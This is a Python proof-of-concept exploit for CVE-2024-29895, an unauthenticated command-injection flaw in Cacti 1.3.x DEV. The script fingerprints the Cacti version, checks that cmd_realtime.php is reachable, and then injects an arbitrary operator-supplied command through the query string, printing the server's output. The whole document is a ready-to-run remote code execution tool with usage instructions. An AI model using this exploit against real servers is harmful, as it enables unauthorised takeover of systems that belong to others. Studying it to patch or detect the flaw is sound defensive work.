#!/usr/bin/python3
# CVE-2024-29895 - RCE in Cacti
#A command injection vulnerability allows any unauthenticated user to execute arbitrary command on the server when register_argc_argv option of PHP is On.
# http://target/cacti/cmd_realtime.php?1+1&&calc.exe+1+1+1

# Cacti (PHP)
# Affected versions:
# 1.3.x DEV

# Usage: python3 cve-2024-29895.py http://target.com:8080/ "id"
# Developed by @stuub

import requests
import argparse
import re
import urllib3
from urllib.parse import urlparse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#ANSI Colors
red = "\033[91m"
green = "\033[92m"
yellow = "\033[93m"
purple = "\033[95m"
reset = "\033[0m"

def get_cacti_version(url):
    try:
        response = requests.get(url, verify=False)
        patterns = [
            r"Cacti (\d+\.\d+\.\d+)",
            r"var cactiVersion='(\d+\.\d+\.\d+)'",
            r"Version (\d+\.\d+\.\d+)"
        ]
        for pattern in patterns:
            version = re.search(pattern, response.text)
            if version:
                return version.group(1)
        return None
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        return None

def validate(url):
    endpoint = "/cacti/cmd_realtime.php"
    url = url + endpoint
    print(f"[*] Validating Target URL: {url}")
    response = requests.get(url, verify=False)

    if response.status_code == 200:
        print(f"[*] Found Cacti installation")
        return True
    else:
        print(f"[!] Endpoint not found")
        return False

def RCE(url, command):
    payload = url + "/cacti/cmd_realtime.php?1+1&&" + command + "+1+1+1"
    print (f"[*] Targeting URL: {payload}")
    try:
        response = requests.get(payload, verify=False)
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        return
    print(f"\n[*] Response:")
    formatted = response.text.replace("<br>", "\n")
    print(formatted)


def main():
    parser = argparse.ArgumentParser(description="CVE-2024-29895 - RCE in Cacti")
    parser.add_argument('-u', '--url', help="URL of the target")
    parser.add_argument('-c', '--command', help="Command to execute")
    args = parser.parse_args()
    url = args.url
    parsedUrl = urlparse(url)
    strippedUrl = f"{parsedUrl.scheme}://{parsedUrl.netloc}"
    url = strippedUrl
    command = args.command

    version = get_cacti_version(url)
    print(f"[*] Found Cacti version: {version}")
        
    if url is None or command is None:
        print(f"Usage: python3 cve-2024-29895.py http://target.com:8080/ -c 'id'")
        exit()
    
    RCE(url, command)

if __name__ == "__main__":
    main()
